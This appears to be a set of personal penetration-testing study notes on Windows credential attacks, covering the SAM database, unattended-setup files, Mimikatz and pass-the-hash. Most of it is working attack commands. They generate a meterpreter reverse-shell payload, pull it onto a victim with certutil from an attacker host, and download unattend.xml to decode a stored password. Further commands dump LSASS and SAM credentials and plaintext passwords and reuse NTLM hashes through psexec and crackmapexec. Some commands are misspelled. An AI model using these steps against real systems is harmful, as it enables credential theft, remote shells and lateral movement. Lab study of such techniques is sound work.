Windows has disabled LM and continued with NTLM hashing from Windows Vista onwards. 

<h2>SAM Database</h2>
	Security Account Manager -- (LM - LanMan)
-> cannot be copied when windows is running. Windows NT kernal keeps it locked.
-> Attacks use in-Memory techniques to dump SAM hashes from the LSASS process.
-> Modern Windows SAM database encrypted with syskey.

![[LM_working.png]]

![[NTLM_working.png]]

<h2>Unattended Windows Setup </h2>

C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Autounattend.xml
Setup Config files are encrypted in base 64
`In attacker machine`
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.49.2 LPORT=5000 -f exe > payload.exe
python3 -m http.server 80
Ctrl + C
service postgresql start && msfconsole
use multi/handler
set PAYLOAD /windows/x64/meterpreter/reverse_tcp
set LPORT 5000
set LHOST 10.10.49.2
```

`in windows(victim) to check privileges`
```
whoami /priv
certutil -urlcache -f http://attackIP.com/payload.exe payload.exe
```

`ON execution of payload in victim machine the metasploit in attacker machine will capture the shell.`
in attacker machine(meterpreter)
```
search -f unattend.xml
cd C:\\
cd Desktop
cd Panther
dir
download unattend.xml
```

`cat unattend.xml you will find <AutoLogon> </AutoLogon> you will find the value of password which is encoded in base64.`

```
base64 -d pasword.txt
```

<h2> Lab </h2>
**PowerSploit**: PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment.

**PowerUp.ps1:** PowerUp aims to be a clearing house of common Windows privilege escalation vectors that rely on misconfigurations.

Source: https://github.com/PowerShellMafia/PowerSploit

<h2> Mimikatz </h2>
 _> Kiwi is an inbuilt extension of meterpreter  than can be used instead of mimikatz_

	we need NT AUTHORITY/SYSTEM to run kiwi . ? is to view all the command of kiwi in meterpreter.
	meterpreter>
```
pgrep lsass
migrate <pid>
getuid
load kiwi
? 
creds_all
lsa_dump_sam // to Syskey and SAMkey
lsa_dump_secrets // could dump plain passwords
----------------------
upload /home/kali/Desktop/mimikatz.exe
shell
.\mimikatz.exe
privilege::debug \\ Privilege '20' ok , then good sign
lsadumb::sam \\Syskey and SAMkey, RID
lsadumb::secrets
sekurlsa::logonpasswords\\logon passwords with clear passwords 
```

<h2>Pass-the-Hash</h2>
```
getuid \\AUTHORITY/SYSTEM
load kiwi
lsa_dump_sam \\ copy Administrator NTLM hash or any
hashdump
Ctrl + Z
use exploit/windows/smb/psexec
set RHOSTS __
set LPORT __
set SMBUser Administrator
set SMBPass <AdministratorNTLMhashiwthLM>
set target Command(choose from options)
run

```

```
	crackmapexec smb VictimIP -u Administrator -H <NTLMhash> -x "whoami"
```

	_>Which one of the following tools can be used to perform a Pass-The-Hash attack?_
	ANSWER: crackmapexec , evil-winrm